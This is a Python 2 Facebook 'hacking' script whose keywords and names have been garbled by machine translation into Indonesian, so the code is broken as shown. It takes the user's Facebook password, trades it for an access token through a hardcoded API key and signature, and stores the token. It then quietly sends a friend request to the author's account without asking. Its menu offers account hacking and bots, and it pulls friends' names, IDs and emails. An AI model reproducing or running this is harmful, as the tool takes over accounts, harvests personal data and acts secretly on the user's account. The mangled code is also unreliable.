# -*- koding: utf-8 -*-

impor os, sys, waktu, datetime, acak, hashlib, re, threading, json, getpass, urllib, permintaan, mekanisasi
dari multiprocessing.pool impor ThreadPool
mencoba:
    mekanisme impor
kecuali ImportError:
    os.system('pip2 install mekanik')
lain:
    mencoba:
        permintaan impor
    kecuali ImportError:
        os.system('pip2 instal permintaan')

dari request.exceptions import ConnectionError
dari browser impor mekanis
isi ulang (sys)
sys.setdefaultencoding('utf8')
br = mekanisasi.Browser()
br.set_handle_robots(Salah)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Versi Presto/2.12.423/12.16')]


def keluar():
    print '\x1b[1;91m[!] Tutup'
    os.sys.keluar()


def jalan(z):
    untuk e dalam z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        waktu.tidur(0.01)
logo = " \x1b[1;92m█████████\n \x1b[1;92m█▄█████▄█ \x1b[1;97m●▬▬▬▬▬▬▬▬ ●\n \x1b[1;92m█ \x1b[1;93m▼▼▼▼▼ \x1b[1;97m- _ --_-- \x1b[ 1;92m╔╦╗┌─┐┬─┐┬┌─ \n \x1b[1;92m█ \x1b[1;97m \x1b[1;97m_-_-- -_ --__ \x1b[1;92m \n \x1b[1;92m█ \x1b[1;93m▲▲▲▲▲ \x1b[1; 97m-- - _ -- \x1b[1;92m═╩╝┴ \x1b[1;93mPremium\n \x1b[1;92m█████████ \x1b[1;97m«==========✧==========»\n \x1b[1;92m \n \x1b[1;97m╔ \ n \x1b[1;97m║ \x1b[1;93m* \x1b[1;97mReCode \x1b[1;91m: \x1b[1;96m Kumpulanremaja \x1b[1;97m \n \x1b[1;97m] \x1b[1;93m* \x1b[1;97mGitHub \x1b[1;91m: \x1b[1;92m \x1b[92mhttps://github.com/kumpulanremaja[ \x1b[1;97m ║\n \ x1b[1;97m║ \x1b[1;93m* \x1b[1;97mSite \x1b[1;91m: \x1b[1;92\x1b[92mhttps://kumpulanremaja.com\x1b[ \x1b[1;97m \n \x1b[1;97m╚══════════════════════════ " '\n\x1b[1;92m[*] Silahkan Login Operamini atau Google Chrome Agar Tidak Checkpoint\n'


def tik():

    titik = [
     '. ', '.. ', '... ']
    untuk o di titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mMemuat \x1b[1;97m' + o,
        sys.stdout.flush()
        waktu.tidur(0.01)


kembali = 0
benang = []
berhasil = []
titik cek = []
gagal = []
id teman = []
idfromteman = []
idmem = []
identitas = []
em = []
emfromfriends = []
hp = []
hpdariteman = []
reaksi = []
reaksi grup = []
komen = []
komengrup = []
daftar grup = []
vulnot = '\x1b[31mBukan Vuln'
vuln = '\x1b[32mVuln'

def masuk():
    os.system('hapus')
    mencoba:
        toket = buka('login.txt', 'r')
        Tidak bisa()
    kecuali (KeyError, IOError):
        os.system('hapus')
        cetak logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mMASUK AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
        id = raw_input('\x1b[1;91m[+] \x1b[1;36mNama Pengguna \x1b[1;91m:\x1b[1;92m ')
        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
        tik()
        mencoba:
            br.open('https://m.facebook.com')
        kecuali mechanize.URLError:
            print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
            keluar()

        br._factory.is_html = Benar
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['lulus'] = pwd
        br.kirim()
        url = br.geturl()
        jika 'simpan perangkat' di url:
            mencoba:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies',' locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = request.get(url, params=data)
                z = json.loads(r.teks)
                zedd = buka('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                request.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                waktu.tidur(1)
                Tidak bisa()
            kecuali request.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
                keluar()

        jika 'pos pemeriksaan' di url:
            print '\n\x1b[1;91m[!] \x1b[1;93mAkun Telah Menjadi Pos Pemeriksaan'
            os.system('rm -rf login.txt')
            waktu.tidur(0.01)
            keluar()
        lain:
            print '\n\x1b[1;91m[!] Gagal Masuk'
            os.system('rm -rf login.txt')
            waktu.tidur(0.01)
            Gabung()


menu def():
    mencoba:
        toket = buka('login.txt', 'r').read()
    kecuali IOError:
        os.system('hapus')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        waktu.tidur(0.01)
        Gabung()
    lain:
        mencoba:
            otw = request.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.teks)
            nama = a['nama']
            id = a['id']
            ots = request.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
            b = json.loads(ots.text)
            sub = str(b['ringkasan']['jumlah_jumlah'])
        kecuali KeyError:
            os.system('hapus')
            print '\x1b[1;91m[!] \x1b[1;93mSepertinya akun kena Checkpoint'
            os.system('rm -rf login.txt')
            waktu.tidur(0.01)
            Gabung()
        kecuali request.exceptions.ConnectionError:
            cetak logo
            print '\x1b[1;91m[!] Tidak Ada Koneksi'
            keluar()

    os.system('hapus')
    cetak logo
    print '\x1b[1;97m\xe2\x95\x94' + 50 * '\xe2\x95\x90' + '╗'
    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b [1;92m' + nama + (39 - len(nama)) * '\x1b[1;97m ' + '║'
    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m FBID \x1b[1;91m: \x1b [1;92m' + id + (39 - len(id)) * '\x1b[1;97m ' + '║'
    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Subs \x1b[1;91m: \x1b [1;92m' + sub + (39 - len(sub)) * '\x1b[1;97m ' + '║'
    print '\x1b[1;97m╠' + 50 * '\xe2\x95\x90' + '╝'

print '║-> \x1b[1;37;40m1. Informasi pengguna'
    print '║-> \x1b[1;37;40m2. Retas Akun Facebook'
    print '║-> \x1b[1;37;40m3. bot'
    print '║-> \x1b[1;37;40m4. Yang lain'
    print '║-> \x1b[1;37;40m5. Memperbarui'
    print '║-> \x1b[1;37;40m6. Keluar'
    print '║-> \x1b[1;31;40m0. Keluar'
    cetak '\x1b[1;37;40m║'
    pilih()


pasti pilih():
    zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    jika zedd == '':
        print '\x1b[1;91m[!] Tidak dapat dikosongkan'
        pilih()
    lain:
        jika zedd == '1':
            informasi()
        lain:
            jika zedd == '2':
                menu_hack()
            lain:
                jika zedd == '3':
                    menu_bot()
                lain:
                    jika zedd == '4':
                        lain()
                    lain:
                        jika zedd == '5':
                            os.system('hapus')
                            cetak logo
                            print 52 * '\x1b[1;97m\xe2\x95\x90'
                            os.system('git tarik master asal')
                            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                            Tidak bisa()
                        lain:
                            jika zedd == '6':
                                os.system('rm -rf login.txt')
				os.system('xdg-buka https://m.facebook.com/rizz.magizz')
                                keluar()
                            lain:
                                jika zedd == '0':
                                    keluar()
                                lain:
                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mTidak tersedia'
                                    pilih()


def informasi():
    os.system('hapus')
    mencoba:
        toket = buka('login.txt', 'r').read()
    kecuali IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        waktu.tidur(0.01)
        Gabung()

    os.system('hapus')
    cetak logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    id = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID\x1b[1;97m/\x1b[1;92mName\x1b[1;91m : \x1b[1;97m')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')
    r = request.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.teks)
    untuk p di cok['data']:
        jika id di p['name'] atau id di p['id']:
            r = request.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
            z = json.loads(r.teks)
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            mencoba:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m : ' + z['nama']
            kecuali KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m : \x1b[1;91mTidak Ada'
            lain:
                mencoba:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID\x1b[1;97m : ' + z['id']
                kecuali KeyError:
                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m : \x1b[1;91mTidak Ada'
                lain:
                    mencoba:
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail\x1b[1;97m : ' + z['email']
                    kecuali KeyError:
                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m : \x1b[1;91mTidak Ada'
             
